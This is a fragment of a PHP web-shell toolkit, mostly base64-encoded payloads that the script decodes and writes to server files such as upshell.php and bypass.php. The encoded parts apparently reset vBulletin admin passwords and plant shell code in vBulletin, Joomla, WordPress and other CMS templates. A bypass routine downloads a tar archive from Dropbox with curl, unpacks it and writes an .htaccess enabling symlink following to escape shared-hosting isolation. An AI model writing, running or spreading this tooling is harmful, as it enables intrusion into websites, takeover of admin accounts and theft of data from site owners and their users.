o1WkVNNWJXSXpTblJNVjFKb1pFZEZhVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFVMG9nYldGWGVHeEphVUoxV1ZjeGJGQlRTbkJpVjBadVdsTkpLMUJIYkhWalNGWXdTVWhTTldOSFZUbEpiRTR4V1cweGNHUWdRMGxuWW0xR2RGcFVNR2xWTTFacFlsZHNNRWxwUWpKWlYzZ3hXbFF3YVZVelZtbGlWMnd3U1dvME9Fd3lXblpqYlRBZ0swcDZjMDVEYmpBOUlpa3BmWDE3Skh0bGVHbDBLQ2w5ZlNZS0pGOXdhSEJwYm1Oc2RXUmxYMjkxZEhCMWREd3ZkR1Y0ZEdGeVpXRStQR0p5UGdvOGFXNXdkWFFnZEhsd1pUMXpkV0p0YVhRZ2RtRnNkV1U5SjBOb1lXNW5aU2NnUGp4aWNqNEtQQzltYjNKdFBqd3ZZMlZ1ZEdWeVBnbzhMMmgwYld3K0Nqdy9DbVZ5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNLSkdodmMzUnVZVzFsSUQwZ0pGOVFUMU5VV3lkb2IzTjBibUZ0WlNkZE93b2taR0p1WVcxbElEMGdKRjlRVDFOVVd5ZGtZbTVoYldVblhUc0tKR1JpZFhObGNpQTlJQ1JmVUU5VFZGc25aR0oxYzJWeUoxMDdDaVJrWW5CaGMzTWdQU0FrWDFCUFUxUmJKMlJpY0dGemN5ZGRPd29rZFhObGNqMXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrZFhObGNpazdDaVJ6WlhSZmRYTmxjaUE5SUNSZlVFOVRWRnNuZFhObGNpZGRPd29rY0dGemN6MXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrY0dGemN5azdDaVJ6WlhSZmNHRnpjeUE5SUNSZlVFOVRWRnNuY0dGemN5ZGRPd29rWlcxaGFXdzljM1J5WDNKbGNHeGhZMlVvSWx3bklpd2lKeUlzSkdWdFlXbHNLVHNLSkhObGRGOWxiV0ZwYkNBOUlDUmZVRTlUVkZzblpXMWhhV3duWFRzS0pIWmlYM0J5WldacGVDQTlJQ1JmVUU5VFZGc25jSEpsWm1sNEoxMDdDaVJrWVhSaElEMGdKRjlRVDFOVVd5ZGtZWFJoSjEwN0NpUnpaWFJmWkdGMFlTQXVQU0FvSWlSa1lYUmhJaWs3Q2lSMFlXSnNaVjl1WVcxbElEMGdKSFppWDNCeVpXWnBlQzRpZFhObGNpSTdDaVIwWVdKc1pWOXVZVzFsTWlBOUlDUjJZbDl3Y21WbWFYZ3VJblJsYlhCc1lYUmxJanNLQ2tCdGVYTnhiRjlqYjI1dVpXTjBLQ1JvYjNOMGJtRnRaU3drWkdKMWMyVnlMQ1JrWW5CaGMzTXBPd3BBYlhsemNXeGZjMlZzWldOMFgyUmlLQ1JrWW01aGJXVXBPd29LSkhGMVpYSjVJRDBnSjNObGJHVmpkQ0FxSUdaeWIyMGdKeUF1SUNSMFlXSnNaVjl1WVcxbElDNGdKeUIzYUdWeVpTQjFjMlZ5Ym1GdFpUMGlKeUF1SUNSelpYUmZkWE5sY2lBdUlDY2lPeWM3Q2lSeVpYTjFiSFFnUFNCdGVYTnhiRjl4ZFdWeWVTZ2tjWFZsY25rcE93b2tjbTkzSUQwZ2JYbHpjV3hmWm1WMFkyaGZZWEp5WVhrb0pISmxjM1ZzZENrN0NpUnpZV3gwSUQwZ0pISnZkMXNuYzJGc2RDZGRPd29rY0dGemN6RWdQU0J0WkRVb0pITmxkRjl3WVhOektUc0tKSEJoYzNNeUlEMGdiV1ExS0NSd1lYTnpNU0F1SUNSellXeDBLVHNLQ2lSeGRXVnljbmt4SUQwZ0oxVlFSRUZVUlNBbklDNGdKSFJoWW14bFgyNWhiV1VnTGlBbklGTkZWQ0J3WVhOemQyOXlaRDBpSnlBdUlDUndZWE56TWlBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVElnUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaU0F1SUNjZ1UwVlVJR1Z0WVdsc1BTSW5JQzRnSkhObGRGOWxiV0ZwYkNBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVE1nUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaVElnTGlBbklGTkZWQ0IwWlcxd2JHRjBaU0E5SWljZ0xpQWtjMlYwWDJSaGRHRWdMaUFuSWlCWFNFVlNSU0IwYVhSc1pTQTlJQ0ptWVhFaU95YzdDZ29rYjJzeFBVQnRlWE54YkY5eGRXVnllU2drY1hWbGNuSjVNU2s3Q2lSdmF6RTlRRzE1YzNGc1gzRjFaWEo1S0NSeGRXVnljbmt5S1RzS0pHOXJNVDFBYlhsemNXeGZjWFZsY25rb0pIRjFaWEp5ZVRNcE93b0thV1lvSkc5ck1TbDdDbVZqYUc4Z0lqeHpZM0pwY0hRK1lXeGxjblFvSjNaQ2RXeHNaWFJwYmlCcGJtWnZJR05vWVc1blpXUWdZVzVrSUZOb1pXeHNJR0YyWVdsc1lXSnNaU0JwY3lCbVlYRXVjR2h3SURvcEp5azdQQzl6WTNKcGNIUStJanNLZlFvL1BpQT0KJzsKCiRmaWxlID0gZm9wZW4oInZiYi5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL3ZiYi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CgppZiAoaXNzZXQoJF9QT1NUWydqbCddKSkKewogICAgbWtkaXIoJ3Vwc2hlbGwnLCAwNzU1KTsKICAgIGNoZGlyKCd1cHNoZWxsJyk7CiRjb25maWdzaGVsbCA9ICdQR2gwYld3K1BHaGxZV1ErQ2dvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSStDZ29LUEdJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUdKc2RXVTdJajVEdzZGamFDQXhJRG9nUEM5emNHRnVQanhpY2lBdlBncGZURzloWkNBdllXUnRhVzVwYzNSeVlYUnZjaUFtWjNRN0lFZHNiMkpoYkNCRGIyNW1hV2QxY21GMGFXOXVJQ1puZERzZ1UzbHpkR1Z5YlNBbVozUTdJRTFsWkdsaElGTmxkSFJwYm1jZ0ptZDBPeUIwYU1PcWJTREVrZUc3aTI1b0lHVGh1cUZ1WnlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGk1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5VFlYVWd4SkhEc3lCMnc2QnZJRTFsWkdsaElFMWhibUZuWlhJZ2RYQWdQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJ5WldRN0lqNXphR1ZzYkM1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5RGFPRzZvWGtnYzJobGJHdzZJRHhoSUdoeVpXWTlJbWgwZEhBNkx5OTJhV04wYVcwdmFXMWhaMlZ6TDNOb1pXeHNMbkJvY0NJZ2RHRnlaMlYwUFNKZllteGhibXNpUG1oMGRIQTZMeTkyYVdOMGFXMHZhVzFoWjJWekwzTm9aV3hzTG5Cb2NEd3ZZVDRtYm1KemNEczhMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZbklnTHo0S1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStQSE53WVc0Z2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ2JHRnlaMlU3SWo1RHc2RmphQ0E4YzNCaGJpQnpkSGxzWlQwaVptOXVkQzF6YVhwbE9pQnNZWEpuWlRzaVBqSThMM053WVc0K0lEcEZaR2wwSUhSbGJYQThjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUG14bFBDOXpjR0Z1UGlCS2IyMXNZU1p1WW5Od096d3ZjM0JoYmo0OEwySStQQzl6Y0dGdVBqeGljaUF2UGdvOFlqNDhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUGtOb3c3cHVaeUIwWVNCMnc2QnZJSEJvNGJxbmJpQjBaVzF3YkdGMFpTQWdKbWQwT3lCbFpHbDBJR1BEb1drZ1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1cGJtUmxlQzV3YUhBOEwzTndZVzQrSURFZ1l6eHpjR0Z1SUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SUd4aGNtZGxPeUkrdzZGcElEd3ZjM0JoYmo1MFpXMXdiR0YwWlNCaVBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodXFWMElHczhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUHNPc0lDMG1aM1E3SUhOaGRtVThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p4aWNpQXZQZ284WWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQanh6Y0dGdUlITjBlV3hsUFNKbWIyNTBMWE5wZW1VNklHeGhjbWRsT3lJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajVqYUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SSs0YnFoZVNCemFHVnNiQ0IyUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN2h1NXRwSUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SStjR0YwYUNCMFBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodTV0cElEeHpjR0Z1SUhOMGVXeGxQU0pqYjJ4dmNqb2djbVZrT3lJK2FXNWtaWGd1Y0dod1BDOXpjR0Z1UGlBOGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQc1NSUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN0Rzend2YzNCaGJqNDhMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDNOd1lXNCtQQzl6Y0dGdVBpQThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p3dmFIUnRiRDQ9Cic7CgokZmlsZSA9IGZvcGVuKCJqbC5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL2psLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnd3AnXSkpCnsKICAgIG1rZGlyKCd1cHNoZWxsJywgMDc1NSk7CiAgICBjaGRpcigndXBzaGVsbCcpOwokY29uZmlnc2hlbGwgPSAnUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJIVmxPeUkrUEM5emNHRnVQZ29LUEdJK1E4T2hZMmdnTVNBNlBDOWlQanh6Y0dGdUlITjBlV3hsUFNKamIyeHZjam9nWW14MVpUc2lQanhpUGxCTVZVZEpUbE04TDJJK1BDOXpjR0Z1UGp4aWNpQXZQZ284WWo0bWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBaVFVUkVJRTVGVnlCUVRGVkhTVTRpUEM5aVBqeGljaUF2UGdvOFlqNG1ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzZ0t5WnVZbk53T3lBaVZWQk1UMEZFSWlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGtNNU9TNWFTVkE4TDNOd1lXNCtQQzlpUGp4aWNpQXZQZ284WWo0bWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGk5M2NDMWpiMjUwWlc1MEwzQnNkV2RwYm5Ndll6azVMMk01T1M1d2FIQThMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZbklnTHo0S1BHSStROE9oWTJnZ01pQTZJRVZrYVhRZ01TQndiSFZuYVc0Z1l1RzZwWFFnYThPc0lDZ2dQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJ5WldRN0lqNWhhMmx6YldWMElDazhMM053WVc0K1BDOWlQanhpY2lBdlBnbzhjM0JoYmlCemRIbHNaVDBpWTI5c2IzSTZJQ015TnpSbE1UTTdJajQ4WWo0bWJtSnpjRHRMYUdrZ1kyOXdlU0JqYjJSbElHTnZiaUJ6YUdWc2JDQjJ3NkJ2SUhSb3c2d2djMkYyWlNCaTRidUxJR3podTVkcEptNWljM0E3SUNabmREc21aM1E3SUhacDRicS9kQ0JpNGJxdGVTQmk0YnFoSUhiRG9HOGdLR0Z6WkdGelpHRnpaSE1wSUNabmREc21aM1E3SUhOaGRtVWdiMnNtYm1KemNEc2dKbWQwT3labmREc2dZMjl3ZVNCdHc2TWdibWQxNGJ1VGJpQmpiMjRnYzJobGJHd2dKbWQwT3labmREc2djMkYyWlNCdmF5Qm80YnEvZENCczRidVhhVHd2WWo0OEwzTndZVzQrUEdKeUlDOCtDanhpUGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUkrUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJHRmphenNpUGladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3lBclBDOXpjR0Z1UGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ0l6STNOR1V4TXpzaVBpQThMM053WVc0K0wzZHdMV052Ym5SbGJuUXZjR3gxWjJsdWN5OWhhMmx6YldWMEwyRnJhWE50WlhRdWNHaHdJRHd2YzNCaGJqNDhMMkkrCic7CgokZmlsZSA9IGZvcGVuKCJ3cC5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL3dwLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsndm4nXSkpCnsKICAgIG1rZGlyKCd1cHNoZWxsJywgMDc1NSk7CiAgICBjaGRpcigndXBzaGVsbCcpOwokY29uZmlnc2hlbGwgPSAnUEdoMGJXdytQR2hsWVdRK0NnbzhiV1YwWVNCb2RIUndMV1Z4ZFdsMlBTSkRiMjUwWlc1MExWUjVjR1VpSUdOdmJuUmxiblE5SW5SbGVIUXZhSFJ0YkRzZ1kyaGhjbk5sZEQxMWRHWXRPQ0krQ2dvS1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStWbWxsZEU1bGVIUWdLRTVWUzBVZ015QXBPand2WWo0OEwzTndZVzQrUEdKeUlDOCtDanhpUGp4aWNpQXZQand2WWo0S1BHSStSRTlYVGt4UFFVUWdNU0JEdzRGSklGUkZUVkJNUlNCRDRidW1RU0JPVlV0RklDMG1aM1E3UEM5aVBqeGljaUF2UGdvOFlqNHRKbWQwT3lCRlJFbFVJRU5QUkVVZ01TQlVVazlPUnlCRHc0RkRJRVpKVEVVZ3hKRERreUF0Sm1kME95QkRTTU9JVGlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGtOUFJFVWdVMGhGVEV3OEwzTndZVzQrSUZiRGdFOG1ibUp6Y0RzOEwySStQR0p5SUM4K0NqeGlQaTBtWjNRN0lGcEpVQ0JNNGJxZ1NUd3ZZajQ4WW5JZ0x6NEtQR0krTFNabmREc2dWVkFnVkVWTlVFeEZQQzlpUGp4aWNpQXZQZ284WWo0dEptZDBPeUJUUlZSVlVEd3ZZajQ4WW5JZ0x6NEtQR0krTFNabmREc2dWTU9NVFNCUVFWUklJRk5JUlV4TVBDOWlQanhpY2lBdlBnbzhZajQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUhKbFpEc2lQanhpY2lBdlBqd3ZjM0JoYmo0OEwySStDanhpY2lBdlBnbzhMMmgwYld3KwonOwoKJGZpbGUgPSBmb3Blbigidm4ucGhwIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiYmIucGhwIiwwNzU1KTsKICAgZWNobyAiPGlmcmFtZSBzcmM9dXBzaGVsbC92bi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CmlmIChpc3NldCgkX1BPU1RbJ2JiJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crUEdobFlXUStDZ284YldWMFlTQm9kSFJ3TFdWeGRXbDJQU0pEYjI1MFpXNTBMVlI1Y0dVaUlHTnZiblJsYm5ROUluUmxlSFF2YUhSdGJEc2dZMmhoY25ObGREMTFkR1l0T0NJK0Nnb0tQR0krUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCeVpXUTdJajVSVmVHNm9rNGdUTU9kSUZWVFJWSXRKbWQwT3lBOEwzTndZVzQrUEdKeUlDOCtKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdJQ3NnSWxGVldlRzdnRTRnVk9HNm9ra2dUTU9LVGlBaVBHSnlJQzgrSm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3SUNzZ0lrTklUeUJRU01PSlVDREVrRlhEbEVrZ1RlRzduaUJTNGJ1WVRrY2dJanhpY2lBdlBpWnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeUFySUZSSXc0cE5JTVNRNGJ1S1RrZ2dST0c2b0U1SElDSWdVRWhRSUNJOFluSWdMejQ4WW5JZ0x6NDhjM0JoYmlCemRIbHNaVDBpWTI5c2IzSTZJSEpsWkRzaVBsRlY0YnFpVGlCTXc1MGdRc09BU1NCV1NlRzZ2bFF0Sm1kME96d3ZjM0JoYmo0OFluSWdMejRtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBaVVWWGh1cUpPSUV6RG5TQlVTZUc3aGxBZ1ZFbE9JRlRodXFKSklFekRpazRnSWp4aWNpQXZQaVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeUFySUZWUVRFOUJSRHhpY2lBdlBqeGljaUF2UGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUkrUTFORVRDQXRKbWQwT3lCTldWTlJURHd2YzNCaGJqNDhZbklnTHo0OGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklHSnNkV1U3SWo1elpXeGxZM1FnS2lCbWNtOXRJR0p2WW14dloxOTFjR3h2WVdROEwzTndZVzQrUEM5aVBqeGljaUF2UGdvOFlqNDhZbklnTHo1VXc0eE5JRk5JUlV4TUxsQklVRHd2WWo0OFluSWdMejRLUEdJK1BHSnlJQzgrUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJIVmxPeUkrSm01aWMzQTdMMkYwZEdGamFHMWxiblF2ZUhoNGVIaDRlSE5vWld4c0xuQm9jRHd2YzNCaGJqNDhMMkkrQ2p3dmFIUnRiRDQ9Cic7CgokZmlsZSA9IGZvcGVuKCJiYi5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL2JiLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KPz4KCgogIDx0cj4KICAgIDx0ZD48dGFibGUgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTczJz4KICAgICAgPHRyPgogICAgICAgIDx0aCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48ZGl2IGFsaWduPSdyaWdodCc+PHNwYW4gY2xhc3M9J3N0eWxlMSc+U09VUkNFICAgOjwvc3Bhbj48L2Rpdj48L3RoPgogICAgICAgIDx0ZCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48Zm9ybSBuYW1lPSdGMScgbWV0aG9kPSdwb3N0Jz4KICAgICAgICAgICAgPGRpdiBhbGlnbj0nbGVmdCc+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndmJiJyAgdmFsdWU9J1ZCQic+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0namwnICB2YWx1ZT0nSm9tTGEnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3dwJyAgdmFsdWU9J1dvcmRQcmVzcyc+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndm4nICB2YWx1ZT0nVmlldE5leHQnPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2JiJyAgdmFsdWU9J0JvLUJsb2cnPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+PC90ZD4KICAgICAgPC90cj4KICAgPHRyPgogICAKPC9ib2R5Pgo8L2h0bWw+
';
    $file       = fopen("upshell.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=upshell.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'bypass') {
    $file       = fopen($dir . "bypass.php", "w+");
    $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+CjxodG1sPgo8IS0tSXRzIEZpcnN0IFB1YmxpYyBWZXJzaW9uIAoKIC0tPgo8L2h0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnPgo8dGl0bGU+OjogQnlQYXNzIDo6IEt5bUxqbmsgOjo8L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgphIHsgCnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjp3aGl0ZTsKIH0KPC9zdHlsZT4gCjxzdHlsZT4KaW5wdXQgeyAKY29sb3I6IzAwMDAzNTsgCmZvbnQ6OHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOwp9Ci5ESVIgeyAKY29sb3I6IzAwMDAzNTsgCmZvbnQ6Ym9sZCA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7Y29sb3I6I0ZGRkZGRjsKYmFja2dyb3VuZC1jb2xvcjojQUEwMDAwOwpib3JkZXItc3R5bGU6bm9uZTsKfQoudHh0IHsgCmNvbG9yOiMyQTAwMDA7IApmb250OmJvbGQgIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfSAKYm9keSwgdGFibGUsIHNlbGVjdCwgb3B0aW9uLCAuaW5mbwp7CmZvbnQ6Ym9sZCAgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOwp9CmJvZHkgewoJYmFja2dyb3VuZC1jb2xvcjogI0U1RTVFNTsKfQouc3R5bGUxIHtjb2xvcjogI0FBMDAwMH0KLnRkCnsKYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsKYm9yZGVyLXRvcDogMHB4Owpib3JkZXItbGVmdDogMHB4Owpib3JkZXItcmlnaHQ6IDBweDsKfQoudGRVUAp7CmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7CmJvcmRlci10b3A6IDFweDsKYm9yZGVyLWxlZnQ6IDBweDsKYm9yZGVyLXJpZ2h0OiAwcHg7CmJvcmRlci1ib3R0b206IDFweDsKfQouc3R5bGU0IHtjb2xvcjogI0ZGRkZGRjsgfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8P3BocAplY2hvICI8Q0VOVEVSPgogIDx0YWJsZSBib3JkZXI9JzEnIGNlbGxwYWRkaW5nPScwJyBjZWxsc3BhY2luZz0nMCcgc3R5bGU9J2JvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IGJvcmRlci1zdHlsZTogc29saWQ7IGJvcmRlci1jb2xvcjogI0MwQzBDMDsgcGFkZGluZy1sZWZ0OiA0OyBwYWRkaW5nLXJpZ2h0OiA0OyBwYWRkaW5nLXRvcDogMTsgcGFkZGluZy1ib3R0b206IDEnIGJvcmRlcmNvbG9yPScjMTExMTExJyB3aWR0aD0nMTAwJScgYmdjb2xvcj0nI0UwRTBFMCc+CiAgICA8dHI+CiAgICAgIDx0ZCBiZ2NvbG9yPScjMDAwMGZmJyBjbGFzcz0ndGQnPjxkaXYgYWxpZ249J2NlbnRlcicgY2xhc3M9J3N0eWxlNCc+IEJ5UGFzczwvZGl2PjwvdGQ+CiAgICAgIDx0ZCBiZ2NvbG9yPScjMDAwMGZmJyBjbGFzcz0ndGQnIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDVweCc+PGRpdiBhbGlnbj0nY2VudGVyJyBjbGFzcz0nc3R5bGU0Jz4KICAgICAgICA8ZGl2IGFsaWduPSdsZWZ0Jz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICA8dGQgd2lkdGg9JzEwMCUnIGhlaWdodD0nMzUwJyBzdHlsZT0ncGFkZGluZzoyMHB4IDIwcHggMjBweCAyMHB4ICc+IjsKCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDEwJ10pKQp7CkBta2RpcigiQnlQYXNzU3ltIik7CkBjaGRpcigiQnlQYXNzU3ltIik7CkBleGVjKCdjdXJsIGh0dHA6Ly9kbC5kcm9wYm94LmNvbS91Lzc0NDI1MzkxL3N5bS50YXIgLW8gc3ltLnRhcicpOwpAZXhlYygndGFyIC14dmYgc3ltLnRhcicpOwoKZWNobyAiPGlmcmFtZSBzcmM9QnlQYXNzU3ltL3N5bSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7CgokZmlsZTMgPSAnT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkRpcmVjdG9yeUluZGV4IHNzc3Nzcy5odG0KQWRkVHlwZSB0eHQgLnBocApBZGRIYW5kbGVyIHR4dCAucGhwJzsKJGZwMyA9IGZvcGVuKCcuaHRhY2